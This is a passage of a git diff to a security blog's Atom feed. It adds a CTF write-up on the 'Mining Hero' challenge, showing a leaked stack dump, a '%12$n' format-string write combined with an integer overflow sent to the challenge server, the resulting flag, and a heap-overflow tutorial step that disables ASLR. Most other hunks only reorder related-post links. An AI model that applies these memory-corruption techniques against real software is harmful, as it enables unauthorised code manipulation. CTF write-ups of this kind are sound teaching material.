+0x555555570eb0.(nil).0x7ffff7cc51e7.0x6.0x7ffff7d9f240.0x250070252e70252e.0x8000000000000000.0x2e70252e70252e70.0x7fffffffdad0.0x38d7ea4c68000.(nil).0x7fffffffda76.0x555555571720.0x555555571ef0.(nil).0x7fffffffdad8.(nil).(nil).(nil).0x555555571ef0.0x555555571ea0.0x555555571700.0x3.0x5555555716d0.0x1c.0x1e.0x2d6d6f72662d74.(nil).(nil).(nil).(nil).0x7fffffffdb50.0x4.0x6c6f6f74.(nil).0x64.0x7fffffffdb78.0xd.0x676172756f636e65.0x746e656d65.0x14.0x5555555716d0.0x1c.0x1c.(nil).0x38d7ea4c68000.(nil).0x2.0x800000000000000e.(nil).0x7ffff7c467b2.(nil).0x7ffff7e6d198.(nil).0x7ffff7da06a0.0x7ffff7fa0700.0x3.0x7ffff7f951a8.0x7ffff7f93ec0.0xff00000006.0x7ffff7c3a541.0x7ffff7d9f980.0x7ffff7d9f980.0x7ffff7da08a0.0x5d4990340e914700.(nil).0x7ffff7fa0700.(nil).0x7ffff7f951a8.0x7ffff7f93ec0.(nil).0x55555555e160.0x7ffff7e69f38.0x7ffff7fa0700.0x7fffffffdca0.0x7ffff7fa0700.0x6.0x6.0x5d4990340e914700.0x7fffffffdd2f.0x7fffffffdd30.0x7fffffffdd30.0x7ffff7f9ed00.0x33.0x33.0x7ffff7f9ed00.0x7ffff7e85176.0xa.0x3fffffffffffffff.0x7ffff7fa0700.0x1.0xf7f6f5f4f3f2f101.0x7ffff7f061ee.0x7ffff7fa0ce0.0x555555559eb0.0x7fffffffdd70.0x5d4990340e914700.0x7fffffffdec0.0x555555559eb0.0x5555555566b0.0x7fffffffdec0.0x7fffffffddd0.0x555555557a0d.0x7fffffffdec8.0x155557b43.0x7fffffffdda0.0x1.0x7ffff7da0033.0x555555559eb0.(nil).0x5d4990340e914700.0x555555559eb0.0x5555555566b0.(nil).0x7ffff7bdb0b3.0x7ffff7d9fb80.0x7fffffffdec8.0x100011c00.0x5555555577de.0x555555559eb0.0x4bf57339303d8b0.0x5555555566b0.0x7fffffffdec0.(nil).(nil).0xfb40a8cc28c3d8b0.0xfb40b848f3cdd8b0.(nil).(nil).(nil).0x1.0x7fffffffdec8.0x7fffffffded8.0x7ffff7ffe190.(nil).(nil).0x5555555566b0.0x7fffffffdec0.(nil).(nil).0x5555555566de.0x7fffffffdeb8.0x1c.0x1.0x7fffffffe243.(nil).0x7fffffffe280.0x7fffffffe290.0x7fffffffe2d8.0x7fffffffe2eb.0x7fffffffe2ff.0x7fffffffe32c.0x7fffffffe343.0x7fffffffe36f.0x7fffffffe381.0x7fffffffe3b7.0x7fffffffe3ce.0x7fffffffe3ee.0x7fffffffe402.0x7fffffffe42b.0x7fffffffe43f.0x7fffffffe456.0x7fffffffe46e.0x7fffffffe481.0x7fffffffe49d.0x7fffffffe4d4.0x7fffffffe4ef.0x7fffffff
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This meant that if used the &lt;code class=&quot;highlighter-rouge&quot;&gt;%12$n&lt;/code&gt; format string in my name, I would write to the twelfth address on the stack. Since the twelfth address on the stack is the &lt;code class=&quot;highlighter-rouge&quot;&gt;god_is_really_happy&lt;/code&gt; pointer, we will be able to change the value of &lt;code class=&quot;highlighter-rouge&quot;&gt;god_is_happy&lt;/code&gt; to true and get the flag!&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ nc host1.metaproblems.com 5950
+Welcome to this very in-depth game. The goal is to amass wealth and earn the god's favor.
+Before we continue, what is your name?
+1%12$n
+Current funds: $150
+Your options are:
+1: Place a bet on a coin flip for a chance to double your money
+2: Go mining to earn some money
+3: Buy things
+4: Quit (Your money will not be saved)
+Please enter a number 1-4 to continue...
+3
+What would you like to buy? Options are encouragement (cost: 20), shout-out-from-literally-god (cost: 1000000000000000), tool (cost: 100), or cancel
+9223372036854775808
+What would you like to buy? Options are encouragement (cost: 20), shout-out-from-literally-god (cost: 1000000000000000), tool (cost: 100), or cancel
+shout-out-from-literally-god
+How many would you like to buy? Must be greater than 0
+9223372036854775808
+Hmmmm
+1
+You have done well!
+Good job!
+I'm feeling generous right now!
+Have a flag!
+MetaCTF{i_W0N_w!thOUt_CHEat!nG!!}
+Sincerely,
+    ~God
+Current funds: $150
+Your options are:
+1: Place a bet on a coin flip for a chance to double your money
+2: Go mining to earn some money
+3: Buy things
+4: Quit (Your money will not be saved)
+Please enter a number 1-4 to continue...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;section class=&quot;related&quot;&gt;
+  &lt;h3 style=&quot;color: black&quot;&gt;Related Posts&lt;/h3&gt;
+  &lt;ul class=&quot;post-list&quot;&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2020/10/21/simple-heap-buffer-overflow.html&quot;&gt;
+          Simple Heap Buffer Overflow
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2020/10/14/return-oriented-programming-tutorial.html&quot;&gt;
+          Return Oriented Programming Tutorial
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2020/07/21/pentesting-greenoptic-1.html&quot;&gt;
+          Pentesting GreenOptic: 1
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+  &lt;/ul&gt;
+&lt;/section&gt;</content><author><name></name></author><summary type="html">Mining Hero (click here for the binary) is a CTF problem I solved when I played in MetaCTF over this weekend. It involves chaining an integer overflow vulnerability with a format string vulnerability in order to obtain the flag. This is my writeup for how I exploited the binary.</summary></entry><entry><title type="html">Simple Heap Buffer Overflow</title><link href="http://localhost:4000/2020/10/21/simple-heap-buffer-overflow.html" rel="alternate" type="text/html" title="Simple Heap Buffer Overflow" /><published>2020-10-21T00:00:00-04:00</published><updated>2020-10-21T00:00:00-04:00</updated><id>http://localhost:4000/2020/10/21/simple-heap-buffer-overflow</id><content type="html" xml:base="http://localhost:4000/2020/10/21/simple-heap-buffer-overflow.html">&lt;p&gt;Earlier today, I was messing around with some code, and I came up with &lt;a href=&quot;../../../assets/other/2020-10-21-heap-buffer-overflow/people.c&quot;&gt;this vulnerable program&lt;/a&gt;. This program was written using bad programming habits on purpose, and I am going to show you how it is vulnerable to a buffer overflow. This isn’t a complicated vulnerability, and while it does involve corrupting memory on the heap, it does not require you to have in-depth knowledge about how the heap works (unlike many other heap exploits).&lt;/p&gt;
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;0 | &lt;span class=&quot;nb&quot;&gt;sudo tee&lt;/span&gt; /proc/sys/kernel/randomize_va_space
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -190,6 +618,12 @@ flag{insert_flag_here}
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2020/10/25/mining-hero-vulnerabilities.html&quot;&gt;
+          Mining Hero Vulnerabilities
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/10/14/return-oriented-programming-tutorial.html&quot;&gt;
           Return Oriented Programming Tutorial
         &lt;/a&gt;
@@ -198,12 +632,6 @@ flag{insert_flag_here}
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/07/21/pentesting-greenoptic-1.html&quot;&gt;
           Pentesting GreenOptic: 1
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/03/27/creating-a-barebones-windows-debugger.html&quot;&gt;
-          Creating a Barebones Windows Debugger
         &lt;/a&gt;
       &lt;/li&gt;
     
@@ -540,6 +968,12 @@ ROPE&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;a_placeholder_32byte_flag!&lt;
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2020/10/25/mining-hero-vulnerabilities.html&quot;&gt;
+          Mining Hero Vulnerabilities
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/10/21/simple-heap-buffer-overflow.html&quot;&gt;
           Simple Heap Buffer Overflow
         &lt;/a&gt;
@@ -548,12 +982,6 @@ ROPE&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;a_placeholder_32byte_flag!&lt;
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/07/21/pentesting-greenoptic-1.html&quot;&gt;
           Pentesting GreenOptic: 1
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/03/27/creating-a-barebones-windows-debugger.html&quot;&gt;
-          Creating a Barebones Windows Debugger
         &lt;/a&gt;
       &lt;/li&gt;
     
@@ -704,6 +1132,12 @@ ROPE&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;a_placeholder_32byte_flag!&lt;
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2020/10/25/mining-hero-vulnerabilities.html&quot;&gt;
+          Mining Hero Vulnerabilities
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/10/21/simple-heap-buffer-overflow.html&quot;&gt;
           Simple Heap Buffer Overflow
         &lt;/a&gt;
@@ -712,12 +1146,6 @@ ROPE&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;a_placeholder_32byte_flag!&lt;
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/10/14/return-oriented-programming-tutorial.html&quot;&gt;
           Return Oriented Programming Tutorial
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/03/27/creating-a-barebones-windows-debugger.html&quot;&gt;
-          Creating a Barebones Windows Debugger
         &lt;/a&gt;
       &lt;/li&gt;
     
@@ -1078,6 +1506,12 @@ void ReadMemory(char *addr_hex, int n) {
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2020/10/25/mining-hero-vulnerabilities.html&quot;&gt;
+          Mining Hero Vulnerabilities
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/10/21/simple-heap-buffer-overflow.html&quot;&gt;
           Simple Heap Buffer Overflow
         &lt;/a&gt;
@@ -1086,12 +1520,6 @@ void ReadMemory(char *addr_hex, int n) {
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/10/14/return-oriented-programming-tutorial.html&quot;&gt;
           Return Oriented Programming Tutorial
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/07/21/pentesting-greenoptic-1.html&quot;&gt;
-          Pentesting GreenOptic: 1
         &lt;/a&gt;
       &lt;/li&gt;
     
@@ -1286,6 +1714,12 @@ r15 0x0
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2020/10/25/mining-hero-vulnerabilities.html&quot;&gt;
+          Mining Hero Vulnerabilities
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/10/21/simple-heap-buffer-overflow.html&quot;&gt;
           Simple Heap Buffer Overflow
         &lt;/a&gt;
@@ -1294,12 +1728,6 @@ r15 0x0
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/10/14/return-oriented-programming-tutorial.html&quot;&gt;
           Return Oriented Programming Tutorial
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/07/21/pentesting-greenoptic-1.html&quot;&gt;
-          Pentesting GreenOptic: 1
         &lt;/a&gt;
       &lt;/li&gt;
     
@@ -1345,6 +1773,12 @@ r15 0x0
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2020/10/25/mining-hero-vulnerabilities.html&quot;&gt;
+          Mining Hero Vulnerabilities
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/10/21/simple-heap-buffer-overflow.html&quot;&gt;
           Simple Heap Buffer Overflow
         &lt;/a&gt;
@@ -1353,12 +1787,6 @@ r15 0x0
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/10/14/return-oriented-programming-tutorial.html&quot;&gt;
           Return Oriented Programming Tutorial
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/07/21/pentesting-greenoptic-1.html&quot;&gt;
-          Pentesting GreenOptic: 1
         &lt;/a&gt;
       &lt;/li&gt;
     
@@ -1388,6 +1816,12 @@ r15 0x0
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2020/10/25/mining-hero-vulnerabilities.html&quot;&gt;
+          Mining Hero Vulnerabilities
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/10/21/simple-heap-buffer-overflow.html&quot;&gt;
           Simple Heap Buffer Overflow
         &lt;/a&gt;
@@ -1396,12 +1830,6 @@ r15 0x0
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/10/14/return-oriented-programming-tutorial.html&quot;&gt;
           Return Oriented Programming Tutorial
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/07/21/pentesting-greenoptic-1.html&quot;&gt;
-          Pentesting GreenOptic: 1
         &lt;/a&gt;
       &lt;/li&gt;
     
@@ -1455,6 +1883,12 @@ c7(): rax = 0x22
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2020/10/25/mining-hero-vulnerabilities.html&quot;&gt;
+          Mining Hero Vulnerabilities
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/10/21/simple-heap-buffer-overflow.html&quot;&gt;
           Simple Heap Buffer Overflow
         &lt;/a&gt;
@@ -1463,12 +1897,6 @@ c7(): rax = 0x22
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/10/14/return-oriented-programming-tutorial.html&quot;&gt;
           Return Oriented Programming Tutorial
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/07/21/pentesting-greenoptic-1.html&quot;&gt;
-          Pentesting GreenOptic: 1
         &lt;/a&gt;
       &lt;/li&gt;
     
@@ -1988,6 +2416,12 @@ exploit
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2020/10/25/mining-hero-vulnerabilities.html&quot;&gt;
+          Mining Hero Vulnerabilities
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/10/21/simple-heap-buffer-overflow.html&quot;&gt;
           Simple Heap Buffer Overflow
         &lt;/a&gt;
@@ -1999,120 +2433,5 @@ exploit
         &lt;/a&gt;
       &lt;/li&gt;
     
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/07/21/pentesting-greenoptic-1.html&quot;&gt;
-          Pentesting GreenOptic: 1
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
   &lt;/ul&gt;
-&lt;/section&gt;</content><author><name></name></author><summary type="html">I have been studying for the OSCP for a little less than two months. I was studying 5-7 hours per day during my winter break, and I’ve learned a lot since I began. At the time of writing this blog post, my exam is in a week, and I just wanted to put down some of my notes that I’ve been using into a blog post. These notes mainly contain commands that I have been using throughout the PWK labs.</summary></entry><entry><title type="html">Creating a Code Grapher Tool</title><link href="http://localhost:4000/2019/11/27/creating-code-grapher-tool.html" rel="alternate" type="text/html" title="Creating a Code Grapher Tool" /><published>2019-11-27T00:00:00-05:00</published><updated>2019-11-27T00:00:00-05:00</updated><id>http://localhost:4000/2019/11/27/creating-code-grapher-tool</id><content type="html" xml:base="http://localhost:4000/2019/11/27/creating-code-grapher-tool.html">&lt;p&gt;A little while ago, I was working on some reverse-engineering CTF problems. I was trying to figure out what a particular function was doing by giving it a particular input, stepping over the function, reading its output, and then repeating those three steps over and over again with different input values so that I could try to guess what the function was trying to do. I then realized that I could easily automate that process using a script, which is where the idea for &lt;a href=&quot;https://github.com/nihaal-prasad/Code-Grapher&quot;&gt;this simple tool&lt;/a&gt; came from.&lt;/p&gt;
-
-&lt;p&gt;To give you an example of how this works, suppose you wanted to reverse engineer the following function:&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0000000000001135 &amp;lt;magic&amp;gt;:
-    1135:	55                   	push   %rbp
-    1136:	48 89 e5             	mov    %rsp,%rbp
-    1139:	89 7d fc             	mov    %edi,-0x4(%rbp)
-    113c:	8b 45 fc             	mov    -0x4(%rbp),%eax
-    113f:	0f af 45 fc          	imul   -0x4(%rbp),%eax
-    1143:	5d                   	pop    %rbp
-    1144:	c3                   	retq   
-
-0000000000001145 &amp;lt;main&amp;gt;:
-    1145:	55                   	push   %rbp
-    1146:	48 89 e5             	mov    %rsp,%rbp
-    1149:	48 83 ec 10          	sub    $0x10,%rsp
-    114d:	bf 03 00 00 00       	mov    $0x3,%edi
-    1152:	e8 de ff ff ff       	callq  1135 &amp;lt;magic&amp;gt;
-    1157:	89 45 fc             	mov    %eax,-0x4(%rbp)
-    115a:	8b 45 fc             	mov    -0x4(%rbp),%eax
-    115d:	89 c6                	mov    %eax,%esi
-    115f:	48 8d 3d 9e 0e 00 00 	lea    0xe9e(%rip),%rdi        # 2004 &amp;lt;_IO_stdin_used+0x4&amp;gt;
-    1166:	b8 00 00 00 00       	mov    $0x0,%eax
-    116b:	e8 c0 fe ff ff       	callq  1030 &amp;lt;printf@plt&amp;gt; 1170:	b8 00 00 00 00       	mov    $0x0,%eax
-    1175:	c9                   	leaveq 
-    1176:	c3                   	retq   
-    1177:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
-    117e:	00 00
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;If you use my script and run the following command, a graph will appear, which will display all of the outputs for the magic() function when you use inputs in the range [0,100] (0 is inclusive, 100 is exclusive).&lt;/p&gt;
-
-&lt;p&gt;&lt;img style=&quot;float: center;&quot; src=&quot;../../../assets/img/2019-11-27-creating-a-code-grapher-tool/graph.png&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Furthermore, there is also a list of points printed out in the output:&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Points:
-[(0, 0), (1, 1), (2, 4), (4, 16), (3, 9), (5, 25), (7, 49), (6, 36), (8, 64), (9, 81), (14, 196), (10, 100), (11, 121), (12, 144), (13, 169), (17, 289), (16, 256), (15, 225), (18, 324), (19, 361), (23, 529), (20, 400), (21, 441), (22, 484), (24, 576), (26, 676), (25, 625), (28, 784), (27, 729), (30, 900), (29, 841), (32, 1024), (31, 961), (33, 1089), (35, 1225), (36, 1296), (34, 1156), (37, 1369), (38, 1444), (41, 1681), (39, 1521), (40, 1600), (42, 1764), (43, 1849), (46, 2116), (44, 1936), (45, 2025), (47, 2209), (49, 2401), (50, 2500), (48, 2304), (51, 2601), (53, 2809), (54, 2916), (52, 2704), (55, 3025), (56, 3136), (57, 3249), (58, 3364), (60, 3600), (59, 3481), (61, 3721), (62, 3844), (64, 4096), (63, 3969), (65, 4225), (66, 4356), (71, 5041), (67, 4489), (68, 4624), (70, 4900), (69, 4761), (72, 5184), (76, 5776), (74, 5476), (75, 5625), (73, 5329), (80, 6400), (81, 6561), (78, 6084), (77, 5929), (79, 6241), (85, 7225), (83, 6889), (84, 7056), (86, 7396), (82, 6724), (88, 7744), (89, 7921), (87, 7569), (90, 8100), (91, 8281), (94, 8836), (93, 8649), (92, 8464), (96, 9216), (95, 9025), (97, 9409), (98, 9604), (99, 9801)]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Essentially, the way that this works is that my Python script will set two breakpoints. In this example, the breakpoints were set at sym.magic and sym.main+21. At sym.magic, the input register (which is set to be rdi) is changed to be one of the input values in the specified range. At sym.main+21, eax is read as the output value, and the point (rdi, eax) is plotted onto the graph.&lt;/p&gt;
-
-&lt;p&gt;The script is implemented using &lt;a href=&quot;https://github.com/radareorg/radare2-r2pipe&quot;&gt;r2pipe&lt;/a&gt;, which allows me to use radare2 commands from within Python and receive their output, and &lt;a href=&quot;https://matplotlib.org/&quot;&gt;matplotlib&lt;/a&gt;, which allows me to easily create graphs in a few lines of code.&lt;/p&gt;
-
-&lt;p&gt;There are several options built within the script that you can use to aid your analysis. You can see all of the options below:&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python grapher.py -h 
-usage: grapher.py [options] filename start stop input output range
-
-Analyzes specified lines of code by executing the code using the given input
-values, recording the output, and displaying the input and output in a graph.
-
-positional arguments:
-  filename              The name of the executable you would like to analyze.
-  start                 The first breakpoint will be set at this location. At
-                        the breakpoint, the input register or memory location
-                        will be changed to the next value in the range.
-  stop                  The second breakpoint will be set at this location. At
-                        the breakpoint, the output will be recorded.
-  input                 The register or memory location that contains the
-                        input value that should be bruteforced. Will be
-                        displayed on the x-axis. Example: &quot;eax&quot;. If using a
-                        memory location, please specify the location using
-                        m[location]. Example: &quot;m[rbp-0x8]&quot;.
-  output                The register or memory location that contains the
-                        output values that should be checked after the code is
-                        executed. Will be displayed on the y-axis. Example:
-                        &quot;eax&quot;. If using a memory location, please specify the
-                        location using m[location]. Example: &quot;m[rbp-0x8]&quot;.
-  range                 The range of values that should be used for the input
-                        during the bruteforce process. Should be in the form
-                        &quot;[lower,upper]&quot; or &quot;[lower,upper,step]&quot;. For example:
-                        [0,101,5] will use 0, 5, 10, ..., 95, 100 as the x
-                        values in the graph. These must be in base 10
-                        (hexadecimal or binary will not work).
-
-optional arguments:
-  -h, --help            show this help message and exit
-  -t [THREADS], --threads [THREADS]
-                        The number of threads that will be used during
-                        execution. Default value is 5.
-  -in [INPUT_FILE], --standard-input [INPUT_FILE]
-                        Uses the 'dor stdin=[INPUT_FILE]' command in radare2
-                        to make the executable read standard input from a
-                        given file instead of having the user type it in.
-  -il [INPUT_LENGTH], --input-length [INPUT_LENGTH]
-                        The amount of bytes placed at the input memory
-                        location. Default value is 1, but this will be
-                        automatically adjusted if it is too small. Is only
-                        used if the input is a memory location and not a
-                        register.
-  -ol [OUTPUT_LENGTH], --output-length [OUTPUT_LENGTH]
-                        The amount of bytes read at the output memory
-                        location. Must be equal to either 1, 2, 4, or 8.
-                        Default value is 1. Is only used if the output is a
-                        memory location and not a register.
-  -e [COMMANDS], --execute [COMMANDS]
-                        Executes the given r2 commands in radare2 right after
-                        the debugger hits the first breakpoint, but before the
-                        input value is set. Example: -e &quot;dr ebx = 7&quot; will
-                        always set ebx equal to 7 at the first breakpoint.
-                        Multiple commands can be separated by a semicolon.
-  -hx, --x-axis-hex     Displays the x-axis in hexadecimal instead of denary.
-  -hy, --y-axis-hex     Displays the y-axis in hexadecimal instead of denary.
-  -j, --jump            Instead of running all of the code that comes before
-                        the breakpoint, if this option is set, rip/eip will
-                        immidiately be set to the start value as soon as the
-                        program opens. This will essentially jump over any
-                        code that comes before the first breakpoint, and it
-                        will make the program only execute the code between
-                        the starting and stopping breakpoints.
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;The script can be found &lt;a href=&quot;https://github.com/nihaal-prasad/Code-Grapher&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;</content><author><name></name></author><summary type="html">A little while ago, I was working on some reverse-engineering CTF problems. I was trying to figure out what a particular function was doing by giving it a particular input, stepping over the function, reading its output, and then repeating those three steps over and over again with different input values so that I could try to guess what the function was trying to do. I then realized that I could easily automate that process using a script, which is where the idea for this simple tool came from.</summary></entry></feed>
+&lt;/section&gt;</content><author><name></name></author><summary type="html">I have been studying for the OSCP for a little less than two months. I was studying 5-7 hours per day during my winter break, and I’ve learned a lot since I began. At the time of writing this blog post, my exam is in a week, and I just wanted to put down some of my notes that I’ve been using into a blog post. These notes mainly contain commands that I have been using throughout the PWK labs.</summary></entry></feed>
